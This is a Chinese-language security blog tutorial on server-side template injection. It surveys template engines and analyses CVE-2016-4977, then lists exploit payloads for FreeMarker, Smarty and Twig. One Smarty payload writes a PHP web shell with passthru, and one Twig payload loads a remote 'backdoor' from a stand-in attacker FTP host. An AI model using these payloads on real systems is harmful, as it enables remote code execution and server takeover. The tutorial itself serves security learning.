<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-各类模板注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/09/04/%E5%90%84%E7%B1%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-09-03T16:00:00.000Z" itemprop="datePublished">2021-09-04</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/09/04/%E5%90%84%E7%B1%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
        各类模板注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="各类模板注入"><a href="#各类模板注入" class="headerlink" title="各类模板注入"></a>各类模板注入</h1><p>注入是格式化字符串漏洞的一种体现，其中模板注入是格式化字符串的非常好的体现，SSTI不属于任何一种语言，只要使用模板的地方就会出现SSTI漏洞</p>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>格式化字符串漏洞是像printf(user_input)类似的代码实现的，其中user_input是用户输入的数据，如果Set-UID root权限开启的时，printf语句可以导致以下结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使得程序崩溃</span><br><span class="line"></span><br><span class="line">任意一块内存读取数据</span><br><span class="line"></span><br><span class="line">修改任意一块内存里的数据</span><br></pre></td></tr></table></figure>
<p>最后一种结果最危险，可以修改set-UID root程序内部变量的值，从而改变这些程序的行为</p>
<p>格式化字符串的形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;The magic number is:%d&quot;,1911) #结果为The magic number is:1911</span><br><span class="line"></span><br><span class="line">print(&quot;My name is %s&quot;%(&#x27;phithon&#x27;,) #结果为My name is phithon</span><br><span class="line"></span><br><span class="line">print(&quot;My name is %(name)%&quot;%&#123;&#x27;name&#x27;:&#x27;phithon&#x27;&#125; #结果为My name is phithon</span><br><span class="line"></span><br><span class="line">print(&quot;My name is &#123;&#125;&quot;.format(&#x27;phithon&#x27;) #结果为My name is phithon</span><br><span class="line"></span><br><span class="line">print(&quot;My name is &#123;name&#125;&quot;.format(name=&#x27;phithon&#x27;) #结果为My name is phithon</span><br></pre></td></tr></table></figure>

<p>其中使用format()方法来格式化字符串的其它表示形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;username&#125;&quot;.format(username=&#x27;phithon&#x27;) # 普通用法</span><br><span class="line"></span><br><span class="line">&#123;username!r&#125;&quot;.format(username=&#x27;phithon&#x27;) # 等同于repr(username)</span><br><span class="line"></span><br><span class="line">&#123;number:0.2f&#125;&quot;.format(number=0.5678) #等同于&quot;%0.2f&quot;%0.5678，保留两位小数</span><br><span class="line"></span><br><span class="line">int: &#123;0:d&#125;;  hex: &#123;0:#x&#125;;  oct: &#123;0:#o&#125;;  bin: &#123;0:#b&#125;&quot;.format(42) # 转换进制</span><br><span class="line"></span><br><span class="line">&#123;user.username&#125;&quot;.format(user=request.username) #获取对象属性</span><br><span class="line"></span><br><span class="line">&#123;arr[2]&#125;&quot;.format(arr=[0,1,2,3,4]) #获取数组键值</span><br></pre></td></tr></table></figure>
<p>详细请看：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/penetration/python-string-format-vulnerability.html">https://www.leavesongs.com/penetration/python-string-format-vulnerability.html</a><br>                  <a target="_blank" rel="noopener" href="https://github.com/shiyanlou/seedlab/blob/master/formatstring.md">https://github.com/shiyanlou/seedlab/blob/master/formatstring.md</a></p>
<h2 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h2><h3 id="php常见"><a href="#php常见" class="headerlink" title="php常见"></a>php常见</h3><h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p>Smarty算是一种比较老的PHP模板引擎，使用比较广泛</p>
<h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>Twig是来自于Symfony的模板引擎，比较容易安装，操作有点像Mustache和liquid</p>
<h4 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h4><p>Blade是Laravel提供的一个既简单又强大的模板引擎，与其它的php引擎不同的是它并不限制在视图使用原生的php代码，所有的Blade视图文件都会被编译为原生的php代码并缓存起来，除非它被修改，否则不会再被编译</p>
<h3 id="java常用的"><a href="#java常用的" class="headerlink" title="java常用的"></a>java常用的</h3><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><p>JSP部署在网络服务器上，可以响应客户端发送的请求，并根据请求生成动态的HTML、XML或其它格式的文档的web网页，然后返回给请求者</p>
<h4 id="FreeMarcker"><a href="#FreeMarcker" class="headerlink" title="FreeMarcker"></a>FreeMarcker</h4><p>FreeMarcer是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户，而是一个java类库，是一款程序员可以嵌入他们所开发产品的组件</p>
<h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>Velocity可以替代java web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力</p>
<h3 id="python常用的"><a href="#python常用的" class="headerlink" title="python常用的"></a>python常用的</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p>flask jinja2是一种广泛使用的模板引擎</p>
<h4 id="django"><a href="#django" class="headerlink" title="django"></a>django</h4><p>django是专属于自己的一个模板引擎，有好用的对象关系映射（ORM），而且它很多东西的耦合性很高</p>
<h4 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h4><p>tornado也有属于自己的一套模板引擎，tornado强调的是异步非阻塞高并发</p>
<p>注意</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同一种语言不同模板引擎支持的语法虽然相同，但是还是有略微的差异，比如tornado模板的render()中支持传入自定义函数以及函数的参数，然后在两个大括号&#123;&#123;&#125;&#125;中执行，但对于djanggo模板引擎来说相对难用一点</span><br></pre></td></tr></table></figure>


<h2 id="模板注入实例"><a href="#模板注入实例" class="headerlink" title="模板注入实例"></a>模板注入实例</h2><p>原理：服务端接收用户的恶意输入后，未经过处理作为web应用模板内容的一部分，模板引擎在进行目标编译渲染时，执行了用户插入的可以破坏模板的语句，导致敏感信息泄露、代码执行或拿到shell</p>
<h3 id="PHP实例"><a href="#PHP实例" class="headerlink" title="PHP实例"></a>PHP实例</h3><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line"></span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[‘name‘]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>

<p>其中{name}的大括号不是模板变量外面的括号，只是为了区别变量和字符串常量，所以可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>模板引擎会将此解析，结果为49</p>
<p>两个实例使用的都是Twig模板引擎</p>
<h3 id="python实例"><a href="#python实例" class="headerlink" title="python实例"></a>python实例</h3><h4 id="实例1-1"><a href="#实例1-1" class="headerlink" title="实例1"></a>实例1</h4><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template = &#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125;</span><br><span class="line">&#123;%% block body %%&#125;</span><br><span class="line">    &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;%% endblock %%&#125;</span><br><span class="line">&#x27;&#x27;&#x27; % (request.url)</span><br><span class="line">    return render_template_string(template), 404</span><br></pre></td></tr></table></figure>
<p>其中代码里面使用%(request.url)是格式化字符串，所以我们只要将49放在url后面，然后它会通过render_template_string()渲染，然后进行解析，结果为49</p>
<h4 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h4><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line">import sys</span><br><span class="line">from jinja2 importTemplate</span><br><span class="line"></span><br><span class="line">template = Template(&quot;Your input: &#123;&#125;&quot;.format(sys.argv[1] if len(sys.argv) &gt; 1 else &#x27;&lt;empty&gt;&#x27;))</span><br><span class="line">print template.render()</span><br></pre></td></tr></table></figure>
<p>代码里利用format()语句来进行格式化字符串，所以我们可以输入49，然后再经过render()来对模板变量渲染解析，结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You input:49</span><br></pre></td></tr></table></figure>


<h3 id="Java实例"><a href="#Java实例" class="headerlink" title="Java实例"></a>Java实例</h3><h4 id="Sping-Security-OAuth-RCE-CVE-2016-4977-漏洞"><a href="#Sping-Security-OAuth-RCE-CVE-2016-4977-漏洞" class="headerlink" title="Sping Security OAuth RCE(CVE-2016-4977)漏洞"></a>Sping Security OAuth RCE(CVE-2016-4977)漏洞</h4><p>Spring Security OAuth是为Spring框架提供安全认证支持的一个模块，就是当用户使用Whitelabel views来处理错误时，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令</p>
<p>影响版本<br>2.0.0 to 2.0.9</p>
<p>1.0.0 to 1.0.5</p>
<p>漏洞分析</p>
<p>我们可以查看src/resources/application.properties的内容来获取clientid和用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">security.oauth2.client.clientId: acme</span><br><span class="line">security.oauth2.client.clientSecret: acmesecret</span><br><span class="line">security.oauth2.client.authorized-grant-types: authorization_code,refresh_token,password</span><br><span class="line">security.oauth2.client.scope: openid</span><br><span class="line">security.oauth2.client.registered-redirect-uri: httP;//localhost</span><br><span class="line">security.user.password: password</span><br></pre></td></tr></table></figure>
<p>因此，我们可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=hellotom</span><br></pre></td></tr></table></figure>
<p>其中client_id为上面获取的，输入用户名user并输入上面得到的密码，<br>然后点击登录后，报错，发现hellotom为不法值，因此我们可以构造${2334-1}，可以看到会回显信息，表达式被执行，因此有触发漏洞</p>
<p>思路分析</p>
<p>首先我们看代码可知whitelabel作为视图来返回错误页面，在看/spring-security-oauth/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java中第18-40行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@FrameworkEndpoint</span><br><span class="line">public class WhitelabelErrorEndpoint &#123;</span><br><span class="line"></span><br><span class="line">    private static final String ERROR = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/oauth/error&quot;)</span><br><span class="line">    public ModelAndView handleError(HttpServletRequest request) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; model = new HashMap&lt;String, Object&gt;();</span><br><span class="line">        Object error = request.getAttribute(&quot;error&quot;);</span><br><span class="line">        // The error summary may contain malicious user input,</span><br><span class="line">        // it needs to be escaped to prevent XSS</span><br><span class="line">        String errorSummary;</span><br><span class="line">        if (error instanceof OAuth2Exception) &#123;</span><br><span class="line">            OAuth2Exception oauthError = (OAuth2Exception) error;</span><br><span class="line">            errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            errorSummary = &quot;Unknown error&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        model.put(&quot;errorSummary&quot;, errorSummary);</span><br><span class="line">        return new ModelAndView(new SpelView(ERROR), model);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里定义了whitelabel的处理方法，程序可以通过oauthError.getSummary()来获取错误信息，看代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.put(&quot;errorSummary&quot;, errorSummary);</span><br><span class="line">return new ModelAndView(new SpelView(ERROR), model);</span><br></pre></td></tr></table></figure>
<p>然后${2334-1}也被带入了errorSummary中，然后errorSummary被装入到model中，最后再用SpelView进行渲染，我们再看pring-security-oauth/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java中第21-54行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class SpelView implements View &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public SpelView(String template) &#123;</span><br><span class="line">        this.template = template;</span><br><span class="line">        this.context.addPropertyAccessor(new MapAccessor());</span><br><span class="line">        this.helper = new PropertyPlaceholderHelper(&quot;$&#123;&quot;, &quot;&#125;&quot;);</span><br><span class="line">        this.resolver = new PlaceholderResolver() &#123;</span><br><span class="line">            public String resolvePlaceholder(String name) &#123;</span><br><span class="line">                Expression expression = parser.parseExpression(name);</span><br><span class="line">                Object value = expression.getValue(context);</span><br><span class="line">                return value == null ? null : value.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public void render(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        ...</span><br><span class="line">        String result = helper.replacePlaceholders(template, resolver);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到render通过helper取${}中的值作为表达式，再用parser.parseExpression来执行，跟进一下replacePlaceholders这个函数，在/org/springframework/util/PropertyPlaceholderHelper.class第47-56行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public String replacePlaceholders(String value, final Properties properties) &#123;</span><br><span class="line">    Assert.notNull(properties, &quot;\&#x27;properties\&#x27; must not be null&quot;);</span><br><span class="line">    return this.replacePlaceholders(value, new PropertyPlaceholderHelper.PlaceholderResolver() &#123;</span><br><span class="line">        public String resolvePlaceholder(String placeholderName) &#123;</span><br><span class="line">            return properties.getProperty(placeholderName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们发现这个函数是个递归，如果表达式的值中有${xxx}这样形式的字符串存在，则以xxx执行，无论有多少个{}，都会被去掉</p>
<p>首先传入了${errorSummary}，然后取errorSummary为表达式进行执行，发现有${2334-1}，则去掉${}后，将2334-1当作表达式执行</p>
<h4 id="实例2-1"><a href="#实例2-1" class="headerlink" title="实例2"></a>实例2</h4><p>此漏洞是2015年blackhat大会讲述的Alfresco的一个SSTI漏洞</p>
<p>实例代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;ex(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7) </span><br></pre></td></tr></table></figure>

<p>用法如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp =“com.acmee.freemarker.WordWrapperDirective”？new（）&gt;</span><br><span class="line"></span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow =“com.acmee.freemarker.WordWrapperDirective”？new（40）&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相当于调用了构造函数创建了一个对象，那么这个payload是调用了freemarker的内置执行命令的对象Excute</p>
<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>原理：通过更改请求参数让含有模板引擎语法的payload，通过页面渲染返回的内容检测含有模板引擎的payload是否有被编译，有，则SSTI，无，则不存在SSTI</p>
<p>可以使用linux中的tplmap来进行扫描</p>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>可以从四个方向进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.模板本身</span><br><span class="line">可以考虑模板本身的语法、内置变量、属性、函数</span><br><span class="line"></span><br><span class="line">2.框架本身</span><br><span class="line">框架的全局变量、属性、函数</span><br><span class="line"></span><br><span class="line">3.语言本身</span><br><span class="line">语言本身的特性</span><br><span class="line"></span><br><span class="line">4.应用本身</span><br><span class="line">考虑应用定义的东西，需要找开源的源码</span><br></pre></td></tr></table></figure>

<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="利用模板本身的特性进行攻击"><a href="#利用模板本身的特性进行攻击" class="headerlink" title="利用模板本身的特性进行攻击"></a>利用模板本身的特性进行攻击</h4><h5 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h5><p>由于Smarty模板会提供安全模式，会强制执行在php安全函数白名单中的函数，所以我们在模板中无法调用php中直接执行命令的函数（相当于存在一个disable_function)，但是我们可以考虑模板本身。$smarty内置变量可用于访问各种环境变量，比如我们可以使用self来得到smarty这个类中的方法</p>
<p>getStreamVariable()<br>此方法可以获取传入变量的流，即读文件</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>class Smarty_Internal_Write_File<br>可以使用这个类的writeFile()方法来写文件，又因为这个类的第三个参数要为smarty类型，所以可以使用self::clearConfig()</p>
<p>因此可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
<p>来写文件</p>
<p>其中passthru()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru — 执行外部程序并且显示原始输出</span><br></pre></td></tr></table></figure>
<p>注意：高版本的smarty模板是禁用前两个函数的，所以可以考虑使用{if 代码}{/if}标签来执行php代码</p>
<h5 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h5><p>虽然Twig框架不能使用静态方法，且所有函数的返回值都转换为字符串，所以我们不能使用self::调用静态变量，可以在官网文档查询：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">https://twig.symfony.com/doc/2.x/templates.html</a></p>
<p>我们可以使用_self，虽然_self没有什么方法，但是有env,env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置，它在environment.php文件中</p>
<p>因此，我们可以通过将缓存位置设置为远程服务器来引入远程文件包含漏洞<br>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>但是allow_url_include一般是打不开的，无法远程包含文件，所以我们可以使用一个调用过滤器的函数getFilter()</p>
